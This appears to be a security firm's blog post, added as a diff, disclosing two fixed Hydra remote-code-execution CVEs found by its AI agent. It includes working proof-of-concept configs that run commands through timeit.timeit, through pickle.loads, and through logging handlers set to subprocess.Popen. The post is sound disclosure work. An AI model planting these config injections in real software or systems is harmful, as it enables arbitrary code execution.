@@ -1,0 +1,238 @@
+---
+title: 'Two High-Severity RCE CVEs in Hydra, the Config Framework Behind Many ML Pipelines'
+summary: 'Hydra is the configuration framework a large part of the Python machine-learning world uses to wire up experiments and apps. We pointed KLUE, our AI security agent, at it, and it found two ways to run code on a machine that loads an untrusted Hydra config. Both get around the blocklist Hydra had already added to stop exactly this. One slips through gaps in that blocklist; the other goes through the logging system, a door the blocklist never guarded. Both were reported, accepted, assigned CVEs (CVE-2026-106441 and CVE-2026-106442), rated High, and fixed.'
+date: '2026-10-07'
+lastmod: '2026-10-07'
+authors: ['appsec-research']
+tags:
+  [
+    'klue',
+    'case-study',
+    'vulnerability-research',
+    'rce',
+    'code-injection',
+    'deserialization',
+    'pickle',
+    'python',
+    'machine-learning',
+    'hydra',
+    'config-security',
+    'autonomous-security',
+    'appsec',
+  ]
+draft: false
+layout: PostSimple
+canonicalUrl: 'https://shellvoide.com/blog/hydra-untrusted-config-rce'
+---
+
+Hydra is the configuration framework that a big slice of the Python machine-learning world runs on. It lets you describe an app or an experiment in YAML, compose that config from many pieces, and override anything from the command line. It is convenient, and it is also powerful in a way that matters for security: a Hydra config can name a Python callable and tell Hydra to go build it. That is the whole point of `instantiate()`, and it is why configs are not just data. They are instructions.
+
+The Hydra maintainers already knew this. An earlier bug (CVE-2026-68508) showed that an attacker who controls a config could point `_target_` at something like `os.system` and get code execution, so they added a blocklist of dangerous callables to shut that down. We pointed KLUE, our security agent, at Hydra to see whether that blocklist actually held. It found two ways through, and we reported both.
+
+The short version: if your application loads a Hydra config you do not fully trust, both of these let the config run arbitrary Python with your app's privileges. The first walks straight through gaps in the blocklist. The second never touches the blocklisted code path at all, because it runs through Hydra's logging setup, which the blocklist was never wired to cover.
+
+## At a glance
+
+| | |
+| --- | --- |
+| **Package** | `hydra-core` (PyPI) |
+| **CVEs** | CVE-2026-106442 (blocklist bypass), CVE-2026-106441 (logging config) |
+| **Criticality** | High, CVSS 7.8, for both |
+| **Affected** | `< 1.3.6`, and `1.4.0.dev0` through `1.4.0.dev8` |
+| **Fixed in** | `1.3.6` and `1.4.0.dev9` |
+| **Impact** | Arbitrary code execution when an app loads an untrusted config |
+| **Discovered by** | KLUE, Shellvoide's autonomous security agent |
+
+| #   | CVE             | Finding                                            | The boundary it got around                                   | Severity   |
+| --- | --------------- | -------------------------------------------------- | ------------------------------------------------------------ | ---------- |
+| 1   | CVE-2026-106442 | `instantiate()` blocklist bypass                   | Slips through gaps in the `_target_` blocklist               | High (7.8) |
+| 2   | CVE-2026-106441 | Code execution through the logging config          | Runs through `dictConfig`, a path the blocklist never covers | High (7.8) |
+
+## How KLUE found it
+
+KLUE does not scan or throw payloads at a running app. It reads code and reasons about it. When it looked at Hydra, it started from the security control the maintainers had already built, because the most useful question to ask about a blocklist is not "is it there" but "what does it miss." A blocklist is a promise that a specific list of bad things is blocked. The interesting work is finding the bad thing that is not on the list, or the road that goes around the list entirely. KLUE found one of each.
+
+## Finding 1: the blocklist has gaps, because every blocklist does
+
+Hydra's `instantiate()` takes a `_target_` from the config, imports it, and calls it. After CVE-2026-68508, it first checks that target against a blocklist of known-dangerous callables. That check does its job on the obvious names:
+
+```python
+from hydra._internal.instantiate._instantiate2 import _is_blocklisted_target
+
+_is_blocklisted_target("os.system")         # True
+_is_blocklisted_target("subprocess.Popen")  # True
+_is_blocklisted_target("builtins.exec")      # True
+_is_blocklisted_target("builtins.eval")      # True
+```
+
+The problem is that "run arbitrary code" is not a short list in Python. The standard library is full of functions that take a string and hand it to `exec()` for you, and none of them look like `os.system`. KLUE went through them and checked each one against the blocklist:
+
+```python
+bypasses = [
+    "timeit.timeit", "timeit.repeat",
+    "cProfile.run", "profile.run",
+    "pdb.run", "pdb.runeval",
+    "pickle.loads", "pickle.load",
+    "base64.b64decode", "marshal.loads",
+]
+for t in bypasses:
+    print(t, _is_blocklisted_target(t))   # every one: False
+```
+
+Not one of these is blocked, and each of them is a way to run code. `timeit.timeit` is the cleanest example: it exists to time a snippet, so it takes a `stmt` string and runs it with `exec`. Point `_target_` at it and the snippet is yours:
+
+```yaml
+# a config that runs a command, straight through the blocklist
+_target_: timeit.timeit
+stmt: "__import__('os').system('id')"
+number: 1
+```
+
+Loading that config through the normal API runs the command. Here it is end to end, writing a file to prove the code ran:
+
+```python
+from hydra.utils import instantiate
+from omegaconf import OmegaConf
+
+cfg = OmegaConf.create({
+    "_target_": "timeit.timeit",
+    "stmt": "open('proof.txt', 'w').write('code ran via instantiate')",
+    "number": 1,
+})
+instantiate(cfg)   # proof.txt is now on disk
+```
+
+The nastier variant uses pickle. Neither `pickle.loads` nor `base64.b64decode` is blocked, and Hydra can nest one target inside another, so an attacker can base64-decode a pickle blob and deserialize it in one config. A pickle payload runs code while it is being unpickled, so this is a full RCE hidden inside what looks like an opaque string:
+
+```yaml
+_target_: pickle.loads
+_args_:
+  - _target_: base64.b64decode
+    _args_:
+      - "gASV...base64 of a malicious pickle..."
+```
+
+<ReasoningTrace
+  label="klue · a deny-list cannot name every way to run code"
+  lines={[
+    {
+      time: '01:22',
+      role: 'STATE',
+      text: `Testing whether the CVE-2026-68508 blocklist covers the exec surface or just the obvious names.`,
+    },
+    {
+      time: '01:24',
+      role: 'AGENT',
+      text: `The blocklist catches os.system, subprocess.Popen, builtins.exec/eval. But it is a deny-list of names, and Python has many stdlib functions that exec a string without looking dangerous: timeit.timeit and timeit.repeat, cProfile.run, profile.run, pdb.run. None are on the list. timeit.timeit alone is a clean exec wrapper reachable as a _target_.`,
+    },
+    {
+      time: '01:27',
+      role: 'AGENT',
+      text: `Separately, pickle.loads and base64.b64decode are both allowed, and instantiate supports nested _target_ in _args_. That lets a config decode and unpickle a blob in one shot, and unpickling runs code. This is not one missing entry; it is the deny-list approach being the wrong shape for this problem. The real fix is an allow-list.`,
+    },
+  ]}
+/>
+
+This is the point worth sitting with. You cannot patch your way out of it by adding `timeit.timeit` to the list, because `cProfile.run` is still there, and `pdb.run` after that, and the next one after that. A blocklist of code-execution primitives in Python is a list you can never finish.
+
+## Finding 2: a door the blocklist was never on
+
+The second bug is more interesting, because it is not a gap in the list. It is a completely separate road to the same place, and the blocklist has no presence on it at all.
+
+When Hydra starts a job, it configures logging. It takes the logging section of your config and hands it to Python's standard `logging.config.dictConfig`:
+
+```python
+# hydra/core/utils.py
+if log_config is not None:
+    conf = OmegaConf.to_container(log_config, resolve=True)
+    if conf["root"] is not None:
+        logging.config.dictConfig(conf)
+```
+
+That looks harmless. The catch is what `dictConfig` is allowed to do. A logging config can name the class of a handler, or give a `()` key that names a factory callable, and `dictConfig` will import and call it. That is a normal logging feature. But it means a logging config can name any importable callable, and nothing on this path ever consults Hydra's `instantiate()` blocklist, because `instantiate()` is never called here.
+
+So an attacker who can influence the logging config, through a config group, a defaults entry, or a command-line override, can put a process launcher where a log handler should go:
+
+```yaml
+# a malicious hydra/job_logging group
+version: 1
+handlers:
+  console:
+    "()": subprocess.Popen
+    args: "id"
+    shell: true
+root:
+  handlers: [console]
+disable_existing_loggers: false
+```
+
+When logging initializes, `dictConfig` resolves `subprocess.Popen` and calls it, and the command runs before a single log line is written. KLUE confirmed it with the exact call Hydra makes:
+
+```python
+import logging.config
+from omegaconf import OmegaConf
+
+conf = OmegaConf.to_container(OmegaConf.create(yaml_cfg), resolve=True)
+logging.config.dictConfig(conf)   # the same call as hydra/core/utils.py
+# -> subprocess.Popen runs "id"
+```
+
+<ReasoningTrace
+  label="klue · the control is on instantiate, the config is not"
+  lines={[
+    {
+      time: '02:05',
+      role: 'AGENT',
+      text: `configure_log passes the logging section straight to logging.config.dictConfig with no validation. dictConfig resolves handler class values and the () factory key through the import system, so it can build any importable callable.`,
+    },
+    {
+      time: '02:07',
+      role: 'AGENT',
+      text: `Crucially this never goes through instantiate(), so the blocklist and the 1.4 allow-list do not apply to it. The whole config-driven-execution defense lives on one path, and logging is a second path to the same capability. Set a handler's () to subprocess.Popen and it runs at startup.`,
+    },
+    {
+      time: '02:09',
+      role: 'AGENT',
+      text: `Not theoretical: the identical pattern in Kedro was CVE-2026-35171. No real logging setup needs to resolve subprocess.Popen as a handler, so restricting handler classes to the logging namespaces breaks nothing legitimate.`,
+    },
+  ]}
+/>
+
+What makes this one easy to miss is that everyone was looking at `instantiate()`, because that is where the known danger was and where the fix went. The logging path reaches the same capability, resolving and calling an arbitrary callable named in a config, but it was never part of the conversation about config-driven execution, so no guard was ever put on it.
+
+## Impact
+
+Both bugs give the same thing: an attacker who can get an untrusted config in front of your application runs code with your application's privileges. That matters for Hydra specifically because of how it is used. Configs are not secrets written once by an admin. They are composed from config groups, shared between teammates, pulled from repositories and model hubs, and overridden on the command line. A config file is exactly the kind of artifact that moves around, and in the ML world it moves around a lot.
+
+The pickle variant of the first bug is the worst for defenders, because the payload is a base64 blob. There is nothing to read, so a config can look completely innocent and still carry a full exploit.
+
+## Mitigation
+
+The fixes are already released. Upgrade to **Hydra 1.3.6**, or **1.4.0.dev9** or later on the 1.4 line. The 1.3.6 fix hardens the blocklist and closes the reported execution and deserialization paths, including the logging route. The 1.4 line goes further and adds an execution whitelist, which is the right long-term shape: instead of trying to name everything that is dangerous, you name the few callables you actually trust, and everything else is rejected. See Hydra's [execution whitelist docs](https://hydra.cc/docs/advanced/execution_whitelist/).
+
+Beyond upgrading:
+
+- Treat Hydra configs as code, because they are. Do not load a config, a config group, or a command-line override from a source you would not run a script from.
+- On 1.4 and later, turn on the execution whitelist for any app that composes untrusted config.
+- If you cannot upgrade yet, do not instantiate untrusted configuration, and keep untrusted files out of your config search path.
+
+## Why both of these happened
+
+Neither bug is exotic. The first is a blocklist that could not list everything, which is the built-in weakness of every blocklist. The second is a security control that covered one code path while a second path reached the same capability untouched. They are two of the most common ways a real defense turns out to have a hole: the list that cannot be finished, and the door nobody put a lock on.
+
+That is the kind of thing KLUE is good at finding, because it does not stop at "there is a blocklist, good." It asks what the blocklist misses and whether there is another way to the same place, and then it goes and checks. The deny-list gaps came from enumerating Python's exec wrappers one by one. The logging path came from asking where else a config gets turned into a live callable. A person confirmed both end to end on a real install. That is the division of labor we are comfortable with: the agent reads the whole surface and asks the awkward questions, and a person closes the loop.
+
+## Disclosure
+
+Both findings were reported to the Hydra maintainers with working proof-of-concept configs and the exact affected code paths. Both were accepted, assigned CVEs, rated High at CVSS 7.8, and fixed in Hydra 1.3.6 and 1.4.0.dev9. Thanks to the maintainers for a careful triage and for moving the 1.4 line toward an allow-list, which is the durable fix for this whole class.
+
+## References
+
+- CVE-2026-106442, `instantiate()` blocklist bypass: [GHSA-rqx7-p7vv-w7hr](https://github.com/hydra-ecosystem/hydra/security/advisories/GHSA-rqx7-p7vv-w7hr)
+- CVE-2026-106441, logging config code execution: [GHSA-c3wx-c55w-pxjq](https://github.com/hydra-ecosystem/hydra/security/advisories/GHSA-c3wx-c55w-pxjq)
+- Prior related fix this builds on: CVE-2026-68508 (the original `instantiate()` blocklist)
+- Hydra execution whitelist: [hydra.cc/docs/advanced/execution_whitelist](https://hydra.cc/docs/advanced/execution_whitelist/)
+
+---
+
+_Want a run like this against your own codebase? Book a time-boxed engagement at [shellvoide.com/book](https://shellvoide.com/book), or reach us at [info@shellvoide.com](mailto:info@shellvoide.com)._
